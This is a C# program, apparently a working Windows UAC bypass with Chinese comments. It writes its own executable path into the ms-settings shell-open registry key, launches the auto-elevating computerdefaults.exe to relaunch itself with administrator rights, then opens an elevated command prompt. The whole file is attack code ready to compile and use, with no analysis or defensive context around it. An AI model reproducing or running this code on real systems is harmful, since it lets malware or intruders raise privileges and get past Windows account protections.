#region Imports
using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;
using System.Management;
#endregion

namespace BB
{
    #region 
    public class Bypass
    {

        public static void ExecuteCommandSync(String command)
        {
            try
            {
                System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd","/c start "+command + "");

                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                procStartInfo.CreateNoWindow = true;
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();
                string result = proc.StandardOutput.ReadToEnd();
            }
            catch (Exception objException)
            {
                Console.WriteLine("Error!");
            }
        }

        public static void uu()
        {
            //启用代码以检查Windows用户的Windows组成员身份
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                
                Bypass.Z("Classes");
                Bypass.Z("Classes\\ms-settings");
                Bypass.Z("Classes\\ms-settings\\shell");
                Bypass.Z("Classes\\ms-settings\\shell\\open");
                RegistryKey registryKey = Bypass.Z("Classes\\ms-settings\\shell\\open\\command");
                string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                registryKey.SetValue("", cpath, RegistryValueKind.String);
                registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                registryKey.Close();

                ExecuteCommandSync("computerdefaults.exe");
                /*
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = "cmd.exe",
                        Arguments = "/c start computerdefaults.exe"
                    });
                }
                catch { }
                */
                Process.GetCurrentProcess().Kill();
            }
            else
            {
                RegistryKey registryKey2 = Bypass.Z("Classes\\ms-settings\\shell\\open\\command");
                registryKey2.SetValue("", "", RegistryValueKind.String);
            }
        }

        public static RegistryKey Z(string x)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
            //这里就是判断registryKey是否为null
            bool flag = !Bypass.checksubkey(registryKey);
            //如果为null
            if (flag)
            {
                //1. 创建 Classes
                //2. 创建 Classes\\ms-settings
                //3. 创建 Classes\\ms-settings\\shell
                //4. 创建 Classes\\ms-settings\\shell\\open
                //5. 创建 Classes\\ms-settings\\shell\\open\\command
                registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
            }
            return registryKey;
        }

        public static bool checksubkey(RegistryKey k)
        {
            bool flag = k == null;
            return !flag;
        }
    }
    #endregion

    class Program
    {
        #region IsAdmin?
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        #endregion

        static void Main(string[] args)
        {
            try
            {
                // 判断是不是administrator,如果不是,那么就调用bypassuas
                if (!IsAdministrator())
                {
                    Bypass.uu();
                }
                else if (IsAdministrator())
                {
                    string AF_E = "cmd.exe";
                    Process.Start("CMD.exe", "/c start " + AF_E);
                    RegistryKey reg_clean = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
                    reg_clean.DeleteSubKeyTree("test");
                    reg_clean.Close();
                }

            }
            catch { Environment.Exit(0); }
        }

        private static string Distinguish64or32System()
        {
            try
            {
                string addressWidth = String.Empty;
                ConnectionOptions mConnOption = new ConnectionOptions();
                ManagementScope mMs = new ManagementScope("//localhost", mConnOption);
                ObjectQuery mQuery = new ObjectQuery("select AddressWidth from Win32_Processor");
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(mMs, mQuery);
                ManagementObjectCollection mObjectCollection = mSearcher.Get();
                foreach (ManagementObject mObject in mObjectCollection)
                {
                    addressWidth = mObject["AddressWidth"].ToString();
                }
                return addressWidth;
            }
            catch (Exception ex)
            {
                return String.Empty;
            }
        }
    }
}
